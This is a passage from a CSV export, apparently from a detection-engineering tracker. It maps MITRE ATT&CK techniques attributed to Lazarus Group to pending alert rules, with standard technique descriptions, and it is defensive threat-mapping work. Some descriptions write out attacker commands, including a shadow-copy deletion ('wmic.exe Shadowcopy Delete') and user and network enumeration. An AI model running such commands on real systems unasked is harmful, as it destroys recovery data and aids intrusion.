Technique ID,Name,Tactics,Status,Linked Rule,Liczba wykryć,Author,Description,MITRE Link,ChangeHistory
T1001.003,Protocol or Service Impersonation,Command-And-Control,Pending,alerts\Lazarus_Group\T1001.003_Protocol_or_Service_Impersonation.html,,APT Matrix Generator,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.    Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.   Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)",https://attack.mitre.org/techniques/T1001/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1005,Data from Local System,Collection,Pending,alerts\Lazarus_Group\T1005_Data_from_Local_System.html,,APT Matrix Generator,"Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.  Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system. ",https://attack.mitre.org/techniques/T1005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1008,Fallback Channels,Command-And-Control,Pending,alerts\Lazarus_Group\T1008_Fallback_Channels.html,,APT Matrix Generator,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,https://attack.mitre.org/techniques/T1008/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1010,Application Window Discovery,Discovery,Pending,alerts\Lazarus_Group\T1010_Application_Window_Discovery.html,,APT Matrix Generator,"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)  Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.",https://attack.mitre.org/techniques/T1010/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1012,Query Registry,Discovery,Pending,alerts\Lazarus_Group\T1012_Query_Registry.html,,APT Matrix Generator,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.  The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",https://attack.mitre.org/techniques/T1012/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1016,System Network Configuration Discovery,Discovery,Pending,alerts\Lazarus_Group\T1016_System_Network_Configuration_Discovery.html,,APT Matrix Generator,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).  Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)  Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",https://attack.mitre.org/techniques/T1016/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1021.001,Remote Desktop Protocol,Lateral-Movement,Pending,alerts\Lazarus_Group\T1021.001_Remote_Desktop_Protocol.html,,APT Matrix Generator,Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.  Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)   Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware),https://attack.mitre.org/techniques/T1021/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1021.002,SMB/Windows Admin Shares,Lateral-Movement,Pending,alerts\Lazarus_Group\T1021.002_SMBWindows_Admin_Shares.html,,APT Matrix Generator,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.  SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.  Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",https://attack.mitre.org/techniques/T1021/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1021.004,SSH,Lateral-Movement,Pending,alerts\Lazarus_Group\T1021.004_SSH.html,,APT Matrix Generator,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.  SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).",https://attack.mitre.org/techniques/T1021/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1027.007,Dynamic API Resolution,Defense-Evasion,Pending,alerts\Lazarus_Group\T1027.007_Dynamic_API_Resolution.html,,APT Matrix Generator,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.  API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)  To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.  Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",https://attack.mitre.org/techniques/T1027/007/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1027.009,Embedded Payloads,Defense-Evasion,Pending,alerts\Lazarus_Group\T1027.009_Embedded_Payloads.html,,APT Matrix Generator,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs)   Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage)   For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021)   Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",https://attack.mitre.org/techniques/T1027/009/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1027.013,Encrypted/Encoded File,Defense-Evasion,Pending,alerts\Lazarus_Group\T1027.013_EncryptedEncoded_File.html,,APT Matrix Generator,"Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.  This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.  The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.  For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File)   Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",https://attack.mitre.org/techniques/T1027/013/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1033,System Owner/User Discovery,Discovery,Pending,alerts\Lazarus_Group\T1033_System_OwnerUser_Discovery.html,,APT Matrix Generator,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.  On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)",https://attack.mitre.org/techniques/T1033/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1036.003,Rename Legitimate Utilities,Defense-Evasion,Pending,alerts\Lazarus_Group\T1036.003_Rename_Legitimate_Utilities.html,,APT Matrix Generator,"Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect Renamed PSExec) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).(Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.(Citation: F-Secure CozyDuke)",https://attack.mitre.org/techniques/T1036/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1036.004,Masquerade Task or Service,Defense-Evasion,Pending,alerts\Lazarus_Group\T1036.004_Masquerade_Task_or_Service.html,,APT Matrix Generator,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.  Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",https://attack.mitre.org/techniques/T1036/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1036.005,Match Legitimate Resource Name or Location,Defense-Evasion,Pending,alerts\Lazarus_Group\T1036.005_Match_Legitimate_Resource_Name_or_Location.html,,APT Matrix Generator,"Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation.   This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)",https://attack.mitre.org/techniques/T1036/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1041,Exfiltration Over C2 Channel,Exfiltration,Pending,alerts\Lazarus_Group\T1041_Exfiltration_Over_C2_Channel.html,,APT Matrix Generator,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,https://attack.mitre.org/techniques/T1041/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1046,Network Service Discovery,Discovery,Pending,alerts\Lazarus_Group\T1046_Network_Service_Discovery.html,,APT Matrix Generator,"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)     Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.  Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)",https://attack.mitre.org/techniques/T1046/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1047,Windows Management Instrumentation,Execution,Pending,alerts\Lazarus_Group\T1047_Windows_Management_Instrumentation.html,,APT Matrix Generator,"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.  The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)  An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)  **Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",https://attack.mitre.org/techniques/T1047/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,Exfiltration,Pending,alerts\Lazarus_Group\T1048.003_Exfiltration_Over_Unencrypted_Non-C2_Protocol.html,,APT Matrix Generator,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)  Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",https://attack.mitre.org/techniques/T1048/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1049,System Network Connections Discovery,Discovery,Pending,alerts\Lazarus_Group\T1049_System_Network_Connections_Discovery.html,,APT Matrix Generator,"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.   An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.  Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), ""net use,"" and ""net session"" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to ""net session"". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, the command `esxi network ip connection list` can be used to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)",https://attack.mitre.org/techniques/T1049/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1053.005,Scheduled Task,"Execution, Persistence, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1053.005_Scheduled_Task.html,,APT Matrix Generator,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)  An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)  Adversaries may also create ""hidden"" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",https://attack.mitre.org/techniques/T1053/005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1055.001,Dynamic-link Library Injection,"Defense-Evasion, Privilege-Escalation",Pending,alerts\Lazarus_Group\T1055.001_Dynamic-link_Library_Injection.html,,APT Matrix Generator,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.    DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017)   Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017)   Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping)   Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/001/,"[{""user"": ""UpdateBot"", 